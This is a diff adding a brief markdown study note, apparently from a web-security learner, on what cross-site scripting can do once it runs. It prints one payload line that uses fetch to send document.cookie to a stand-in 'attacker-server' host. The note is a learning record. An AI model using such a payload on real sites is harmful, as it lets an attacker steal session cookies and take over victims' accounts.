@@ -1,0 +1,20 @@
+## Overview
+Today I explored the impact side of Cross-Site Scripting (XSS), focusing on how malicious JavaScript can access browser cookies and send them to an attacker-controlled server.
+
+## Concept
+JavaScript running in the victim's browser can access:
+- document.cookie
+- session identifiers
+- authentication-related data
+
+## Payload Concept
+fetch('https://attacker-server/'+document.cookie)
+
+## Key Insight
+The danger of XSS is not the popup itself, but what malicious JavaScript can do with the victim’s trusted browser session.
+
+## Additional Note
+While attempting the lab, I also learned that some advanced testing workflows rely on professional tooling features such as Burp Collaborator.
+
+This reinforced an important lesson:
+understanding attack logic is more important than depending entirely on tools.
